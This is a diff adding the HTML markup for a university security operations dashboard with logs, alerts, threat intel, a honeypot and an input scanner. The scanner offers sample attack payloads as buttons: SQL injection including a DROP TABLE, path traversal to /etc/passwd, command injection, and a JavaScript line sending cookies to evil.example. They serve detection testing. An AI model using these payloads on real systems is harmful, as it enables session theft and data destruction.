@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UniSOC | University Security Operations Center</title>
+<link rel="stylesheet" href="style.css">
+<script src="chartR1.js"></script>
+</head>
+<body>
+<div id="toast-area" aria-live="polite" aria-atomic="true"></div>
+<input type="text" id="hp-username" name="username" autocomplete="off" tabindex="-1">
+
+<div class="layout">
+  <aside class="sidebar">
+    <div class="sidebar-brand">
+      <div class="brand-icon" aria-hidden="true"></div>
+      <div class="brand-text">
+        <div class="brand-name">UniSOC</div>
+        <div class="brand-sub">SECURITY OPS CENTER</div>
+      </div>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">Monitor</div>
+      <button class="nav-item active" type="button" data-view="overview">
+        <svg class="nav-icon icon" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"></rect><rect x="14" y="3" width="7" height="7" rx="1"></rect><rect x="3" y="14" width="7" height="7" rx="1"></rect><rect x="14" y="14" width="7" height="7" rx="1"></rect></svg>
+        Overview
+      </button>
+      <button class="nav-item" type="button" data-view="logs">
+        <svg class="nav-icon icon" viewBox="0 0 24 24"><path d="M9 12h6M9 16h6M9 8h6M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z"></path></svg>
+        Activity Logs
+        <span class="nav-badge" id="log-badge">0</span>
+      </button>
+      <button class="nav-item" type="button" data-view="alerts">
+        <svg class="nav-icon icon" viewBox="0 0 24 24"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path><path d="M13.73 21a2 2 0 0 1-3.46 0"></path></svg>
+        Alerts
+        <span class="nav-badge" id="alert-badge">0</span>
+      </button>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">Analyze</div>
+      <button class="nav-item" type="button" data-view="scanner">
+        <svg class="nav-icon icon" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.35-4.35"></path></svg>
+        Input Scanner
+      </button>
+      <button class="nav-item" type="button" data-view="intel">
+        <svg class="nav-icon icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>
+        Threat Intel
+        <span class="nav-badge amber" id="intel-badge">0</span>
+      </button>
+      <button class="nav-item" type="button" data-view="anomaly">
+        <svg class="nav-icon icon" viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+        Anomaly Detection
+      </button>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">Admin Only</div>
+      <button class="nav-item" type="button" data-view="honeypot">
+        <svg class="nav-icon icon" viewBox="0 0 24 24"><path d="M12 2a5 5 0 1 0 0 10A5 5 0 0 0 12 2z"></path><path d="M12 12c-5.33 0-8 2.67-8 4v2h16v-2c0-1.33-2.67-4-8-4z"></path></svg>
+        Honeypot
+      </button>
+      <button class="nav-item" type="button" data-view="export">
+        <svg class="nav-icon icon" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+        Export Logs
+      </button>
+    </div>
+
+    <div class="sidebar-role">
+      <div class="role-card">
+        <div class="role-avatar" id="role-avatar">AD</div>
+        <div>
+          <div class="role-name" id="role-name">SOC Administrator</div>
+          <div class="role-badge" id="role-tag">ADMIN SOC ACCESS</div>
+        </div>
+      </div>
+      <div class="operator-note" id="operator-note">
+        Authenticated admin workspace. Live SOC actions are audited and enforced against the Laravel backend.
+      </div>
+    </div>
+  </aside>
+
+  <main class="main">
+    <div class="topbar">
+      <div class="topbar-branding">
+        <img src="logo.png" alt="University logo" class="topbar-logo">
+        <div class="topbar-title-block">
+          <div class="topbar-eyebrow">University SOC</div>
+          <div class="topbar-title" id="view-title">Security Overview</div>
+        </div>
+      </div>
+
+      <div class="topbar-search">
+        <span class="search-icon" aria-hidden="true">⌕</span>
+        <input type="search" id="global-search" maxlength="120" placeholder="Search logs, IPs, users, events">
+      </div>
+
+      <div class="status-pill is-syncing" id="data-status-pill">
+        <span class="status-dot" id="data-status-dot"></span>
+        <span id="data-status-label">SYNCING API</span>
+      </div>
+
+      <div class="topbar-actions">
+        <button class="topbar-btn" type="button" id="theme-toggle">Light Mode</button>
+        <div class="operator-chip" id="operator-chip">admin@university.edu</div>
+        <button class="topbar-btn danger" type="button" id="logout-btn">Logout</button>
+      </div>
+
+      <div class="topbar-time" id="topbar-clock"></div>
+    </div>
+
+    <div class="content">
+      <div class="data-source-banner" id="data-source-banner"></div>
+
+      <section id="view-overview" class="view-section">
+        <div class="kpi-grid">
+          <div class="kpi-card">
+            <div class="kpi-label">Security Score</div>
+            <div class="kpi-value text-green" id="kpi-score">0</div>
+            <div class="kpi-sub" id="kpi-score-sub">Awaiting authenticated data</div>
+          </div>
+          <div class="kpi-card">
+            <div class="kpi-label">Total Attacks</div>
+            <div class="kpi-value text-red" id="kpi-attacks">0</div>
+            <div class="kpi-sub" id="kpi-attacks-sub">Last 24 hours</div>
+          </div>
+          <div class="kpi-card">
+            <div class="kpi-label">Active Threats</div>
+            <div class="kpi-value text-amber" id="kpi-threats">0</div>
+            <div class="kpi-sub" id="kpi-threats-sub">Last 60 minutes</div>
+          </div>
+          <div class="kpi-card">
+            <div class="kpi-label">Failed Logins</div>
+            <div class="kpi-value text-blue" id="kpi-failed">0</div>
+            <div class="kpi-sub" id="kpi-failed-sub">Detected last hour</div>
+          </div>
+          <div class="kpi-card">
+            <div class="kpi-label">Blocked IPs</div>
+            <div class="kpi-value mono" id="kpi-blocked">0</div>
+            <div class="kpi-sub" id="kpi-blocked-sub">Active blocklist entries</div>
+          </div>
+        </div>
+
+        <div class="dashboard-grid">
+          <article class="card col-span-2">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+              <span class="card-title">Attack Vector Timeline</span>
+              <span class="card-badge badge-red" id="attack-count-badge">LIVE</span>
+              <div class="card-actions">
+                <button class="export-btn" type="button" data-export="json">JSON</button>
+                <button class="export-btn" type="button" data-export="csv">CSV</button>
+              </div>
+            </div>
+            <div class="card-body">
+              <div class="chart-wrap"><canvas id="attackChart"></canvas></div>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+              <span class="card-title">Security Score</span>
+            </div>
+            <div class="card-body">
+              <div class="score-wrap">
+                <div class="score-ring-wrap">
+                  <svg width="120" height="120" viewBox="0 0 120 120">
+                    <circle cx="60" cy="60" r="52" fill="none" stroke="rgba(255,255,255,0.06)" stroke-width="10"></circle>
+                    <circle id="score-ring" cx="60" cy="60" r="52" fill="none" stroke="var(--green)" stroke-width="10" stroke-linecap="round" stroke-dasharray="326.7" stroke-dashoffset="88" transform="rotate(-90 60 60)"></circle>
+                  </svg>
+                  <div class="score-num">
+                    <span class="score-big text-green" id="score-display">0</span>
+                    <span class="score-of">/ 100</span>
+                  </div>
+                </div>
+
+                <div class="score-factors">
+                  <div class="factor-row">
+                    <span class="factor-label">Auth Security</span>
+                    <div class="factor-bar"><div class="factor-fill" id="f1"></div></div>
+                    <span class="factor-val mono" id="f1v">0</span>
+                  </div>
+                  <div class="factor-row">
+                    <span class="factor-label">Alert Coverage</span>
+                    <div class="factor-bar"><div class="factor-fill" id="f2"></div></div>
+                    <span class="factor-val mono" id="f2v">0</span>
+                  </div>
+                  <div class="factor-row">
+                    <span class="factor-label">Threat Containment</span>
+                    <div class="factor-bar"><div class="factor-fill" id="f3"></div></div>
+                    <span class="factor-val mono" id="f3v">0</span>
+                  </div>
+                  <div class="factor-row">
+                    <span class="factor-label">Rate Limiting</span>
+                    <div class="factor-bar"><div class="factor-fill" id="f4"></div></div>
+                    <span class="factor-val mono" id="f4v">0</span>
+                  </div>
+                  <div class="factor-row">
+                    <span class="factor-label">CSRF Defense</span>
+                    <div class="factor-bar"><div class="factor-fill" id="f5"></div></div>
+                    <span class="factor-val mono" id="f5v">0</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+              <span class="card-title">Live Alerts</span>
+              <span class="card-badge badge-red" id="alert-count-badge">0 ACTIVE</span>
+            </div>
+            <div class="card-body" id="alerts-container"></div>
+          </article>
+
+          <article class="card col-span-2">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><path d="M3 3h18v18H3zM3 9h18M9 21V9"></path></svg>
+              <span class="card-title">Recent Activity</span>
+              <span class="card-badge badge-blue" id="activity-live-badge">LIVE API</span>
+              <div class="card-actions">
+                <button class="export-btn" type="button" id="view-all-logs-btn">View All</button>
+              </div>
+            </div>
+            <div class="card-body card-table-body">
+              <div class="brute-banner" id="brute-banner">
+                <span class="banner-icon">!</span>
+                <span class="brute-banner-msg" id="brute-msg">Monitoring active attack patterns.</span>
+              </div>
+              <table class="log-table">
+                <thead>
+                  <tr>
+                    <th>User</th>
+                    <th>Event</th>
+                    <th>IP Address</th>
+                    <th>Risk</th>
+                    <th>Time</th>
+                  </tr>
+                </thead>
+                <tbody id="overview-log-body"></tbody>
+              </table>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <section id="view-logs" class="view-section hidden-view">
+        <article class="card">
+          <div class="card-header">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M9 12h6M9 16h6M9 8h6M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z"></path></svg>
+            <span class="card-title">Activity Logs</span>
+            <span class="card-badge badge-blue" id="full-log-count">0 entries</span>
+            <div class="card-actions">
+              <button class="export-btn" type="button" data-export="csv">CSV</button>
+              <button class="export-btn" type="button" data-export="json">JSON</button>
+            </div>
+          </div>
+          <div class="card-body">
+            <div class="log-controls log-controls-grid">
+              <input type="search" class="filter-input" id="log-search" maxlength="120" placeholder="Global filter">
+              <input type="text" class="filter-input" id="log-ip-filter" maxlength="45" placeholder="Filter by IP">
+              <input type="text" class="filter-input" id="log-user-filter" maxlength="120" placeholder="Filter by user">
+              <input type="text" class="filter-input" id="log-event-filter" maxlength="120" placeholder="Filter by event">
+              <select class="filter-select" id="log-status-filter">
+                <option value="">All Status</option>
+                <option value="success">Success</option>
+                <option value="failed">Failed</option>
+                <option value="blocked">Blocked</option>
+                <option value="suspicious">Suspicious</option>
+              </select>
+              <select class="filter-select" id="log-risk-filter">
+                <option value="">All Risk</option>
+                <option value="critical">Critical</option>
+                <option value="high">High</option>
+                <option value="medium">Medium</option>
+                <option value="low">Low</option>
+              </select>
+            </div>
+
+            <table class="log-table">
+              <thead>
+                <tr>
+                  <th>#</th>
+                  <th>User</th>
+                  <th>Event</th>
+                  <th>IP Address</th>
+                  <th>Risk</th>
+                  <th>Status</th>
+                  <th>Timestamp</th>
+                  <th>Actions</th>
+                </tr>
+              </thead>
+              <tbody id="full-log-body"></tbody>
+            </table>
+
+            <div class="row page-row">
+              <span class="page-info" id="page-info">Page 1</span>
+              <div class="row">
+                <button class="page-btn" id="log-prev" type="button">Prev</button>
+                <button class="page-btn" id="log-next" type="button">Next</button>
+              </div>
+            </div>
+          </div>
+        </article>
+      </section>
+
+      <section id="view-scanner" class="view-section hidden-view">
+        <div class="dashboard-grid">
+          <article class="card col-span-2">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.35-4.35"></path></svg>
+              <span class="card-title">Input Security Scanner</span>
+              <span class="card-badge badge-blue">Multi-vector</span>
+            </div>
+            <div class="card-body">
+              <p class="card-copy">
+                Detects SQL injection, XSS, command injection, path traversal, template injection, and fuzzing patterns.
+                Scanner checks are client-side triage only; production enforcement happens in the Laravel backend.
+              </p>
+              <div class="brute-banner" id="scan-rate-banner">
+                <span class="banner-icon">!</span>
+                <span class="brute-banner-msg">Rate limit reached. Wait before issuing more manual scans.</span>
+              </div>
+              <div class="scanner-input-wrap">
+                <input type="text" id="scan-input" class="scanner-input" maxlength="5000" placeholder="Enter payload to analyze">
+                <button class="scan-btn" id="scan-btn" type="button">Scan</button>
+              </div>
+              <div class="scan-result" id="scan-result">
+                <div class="scan-result-title" id="scan-result-title"></div>
+                <div class="scan-result-detail" id="scan-result-detail"></div>
+                <div class="scan-threats" id="scan-threats"></div>
+              </div>
+              <div class="sep"></div>
+              <div class="section-divider">Quick Test Payloads</div>
+              <div class="payload-grid">
+                <button class="export-btn payload-btn" type="button" data-payload="SELECT * FROM users WHERE id='1' OR '1'='1'">SQLi Classic</button>
+                <button class="export-btn payload-btn" type="button" data-payload="&lt;script&gt;alert(document.cookie)&lt;/script&gt;">XSS Cookie Steal</button>
+                <button class="export-btn payload-btn" type="button" data-payload="; DROP TABLE audit_log; --">SQLi Drop Table</button>
+                <button class="export-btn payload-btn" type="button" data-payload="../../etc/passwd">Path Traversal</button>
+                <button class="export-btn payload-btn" type="button" data-payload="| ls -la /var/www">Command Inject</button>
+                <button class="export-btn payload-btn" type="button" data-payload="javascript:void(fetch('https://evil.example/?c='+document.cookie))">JS Injection</button>
+                <button class="export-btn payload-btn" type="button" data-payload="hello world">Benign Input</button>
+              </div>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+              <span class="card-title">IP Reputation Checker</span>
+            </div>
+            <div class="card-body">
+              <div class="scanner-input-wrap">
+                <input type="text" id="ip-input" class="scanner-input" maxlength="45" placeholder="203.45.67.89">
+                <button class="scan-btn" id="ip-check-btn" type="button">Check</button>
+              </div>
+              <div class="ip-result" id="ip-result">
+                <div class="ip-row"><span class="ip-key">IP Address</span><span class="ip-val mono" id="ip-r-addr"></span></div>
+                <div class="ip-row"><span class="ip-key">Country</span><span class="ip-val" id="ip-r-country"></span></div>
+                <div class="ip-row"><span class="ip-key">ISP</span><span class="ip-val" id="ip-r-isp"></span></div>
+                <div class="ip-row"><span class="ip-key">Threat Type</span><span class="ip-val" id="ip-r-type"></span></div>
+                <div class="ip-row"><span class="ip-key">Abuse Score</span><span class="ip-val" id="ip-r-score"></span></div>
+                <div class="ip-row"><span class="ip-key">Verdict</span><span class="ip-val" id="ip-r-verdict"></span></div>
+                <div class="ip-rep-bar"><div class="ip-rep-fill" id="ip-rep-fill"></div></div>
+              </div>
+              <div class="sep"></div>
+              <p class="card-copy compact">
+                Threat reputation is resolved from the current SOC intel cache. External enrichment can be added later without changing the dashboard flow.
+              </p>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <section id="view-alerts" class="view-section hidden-view">
+        <article class="card">
+          <div class="card-header">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path></svg>
+            <span class="card-title">Security Alerts</span>
+            <span class="card-badge badge-red" id="alerts-view-count">0 active</span>
+          </div>
+          <div class="card-body" id="alerts-view-body"></div>
+        </article>
+      </section>
+
+      <section id="view-intel" class="view-section hidden-view">
+        <div class="dashboard-grid">
+          <article class="card col-span-2">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle></svg>
+              <span class="card-title">Top Attacking IPs</span>
+              <span class="card-badge badge-red">Live ranking</span>
+            </div>
+            <div class="card-body">
+              <div class="intel-grid" id="top-attackers-body"></div>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+              <span class="card-title">Threat Intelligence Panel</span>
+              <span class="card-badge badge-amber">Derived</span>
+            </div>
+            <div class="card-body" id="intel-summary-body"></div>
+          </article>
+
+          <article class="card col-span-3">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><path d="M3 3h18v18H3zM3 9h18M9 21V9"></path></svg>
+              <span class="card-title">Recent SOC Actions</span>
+              <span class="card-badge badge-blue">Audited</span>
+            </div>
+            <div class="card-body" id="recent-actions-body"></div>
+          </article>
+        </div>
+      </section>
+
+      <section id="view-anomaly" class="view-section hidden-view">
+        <div class="dashboard-grid">
+          <article class="card col-span-2">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+              <span class="card-title">User Behavior Anomaly Detection</span>
+              <span class="card-badge badge-purple">Rule-driven</span>
+            </div>
+            <div class="card-body">
+              <p class="card-copy">
+                Anomaly scoring is computed from repeated failed authentication, suspicious admin timing, threat clustering, and explicit analyst actions.
+              </p>
+              <table class="log-table">
+                <thead>
+                  <tr>
+                    <th>User</th>
+                    <th>Status</th>
+                    <th>Trigger</th>
+                    <th>Risk Score</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody id="anomaly-table"></tbody>
+              </table>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-header">
+              <svg class="icon" viewBox="0 0 24 24"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+              <span class="card-title">Detection Rules</span>
+            </div>
+            <div class="card-body">
+              <div class="factor-row"><span class="factor-label">Brute-force (5 failures / 15m)</span><span class="card-badge badge-green">ACTIVE</span></div>
+              <div class="factor-row"><span class="factor-label">Off-hours admin access</span><span class="card-badge badge-green">ACTIVE</span></div>
+              <div class="factor-row"><span class="factor-label">High-risk cluster by IP</span><span class="card-badge badge-green">ACTIVE</span></div>
+              <div class="factor-row"><span class="factor-label">Suspicious operator action trail</span><span class="card-badge badge-green">ACTIVE</span></div>
+              <div class="factor-row"><span class="factor-label">Honeypot engagement</span><span class="card-badge badge-green">ACTIVE</span></div>
+              <div class="factor-row"><span class="factor-label">Rate limiting abuse</span><span class="card-badge badge-amber">MONITOR</span></div>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <section id="view-honeypot" class="view-section hidden-view">
+        <div class="dashboard-grid">
+          <article class="card col-span-2">
+            <div class="card-header">
+              <span class="emoji-badge" aria-hidden="true">H</span>
+              <span class="card-title">Honeypot Attacker Activity</span>
+              <span class="card-badge badge-amber">DECOY SYSTEM</span>
+            </div>
+            <div class="card-body">
+              <p class="card-copy">
+                Traffic in this panel is considered hostile by default. Each hit is recorded as a real security event and correlated with block and ban actions.
+              </p>
+              <div class="honeypot-log" id="hp-log"></div>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-header">
+              <span class="emoji-badge" aria-hidden="true">!</span>
+              <span class="card-title">Decoy Surface</span>
+            </div>
+            <div class="card-body">
+              <div class="hp-entry"><span class="hp-ip">/api/admin/users</span><span class="hp-action">Credential harvesting trap</span></div>
+              <div class="hp-entry"><span class="hp-ip">/api/debug/env</span><span class="hp-action">Configuration disclosure trap</span></div>
+              <div class="hp-entry"><span class="hp-ip">/wp-admin</span><span class="hp-action">Legacy CMS probe trap</span></div>
+              <div class="hp-entry"><span class="hp-ip">/phpMyAdmin</span><span class="hp-action">Database console trap</span></div>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <section id="view-export" class="view-section hidden-view">
+        <article class="card export-card">
+          <div class="card-header">
+            <svg class="icon" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+            <span class="card-title">Export Security Logs</span>
+          </div>
+          <div class="card-body">
+            <p class="card-copy">
+              Exports are generated from the active authenticated filters and are intended for analyst workflows, incident review, and controlled handoff into SIEM tooling.
+            </p>
+            <div class="export-stack">
+              <button class="scan-btn export-stack-btn" type="button" id="export-json-btn">Export as JSON</button>
+              <button class="scan-btn export-stack-btn" type="button" id="export-csv-btn">Export as CSV</button>
+            </div>
+            <div class="export-warning">
+              Handle exported logs according to university retention and privacy policy. All exports remain auditable through backend action logs.
+            </div>
+          </div>
+        </article>
+      </section>
+    </div>
+  </main>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
